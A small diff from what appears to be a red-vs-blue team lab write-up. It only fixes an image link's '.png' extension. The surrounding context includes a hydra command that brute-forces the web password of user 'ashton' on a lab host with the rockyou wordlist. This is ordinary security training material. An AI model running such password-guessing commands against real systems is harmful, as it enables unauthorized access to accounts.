@@ -92,7 +92,7 @@ I need a password to gain access to the &quot;_secret\_folder_&quot;. To get the
 hydra -l ashton -P ./root/Downloads/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get "/company_folders/secret_folder"
 ```
 
-![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/ashtonpsswd)
+![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/ashtonpsswd.png)
  
  
 
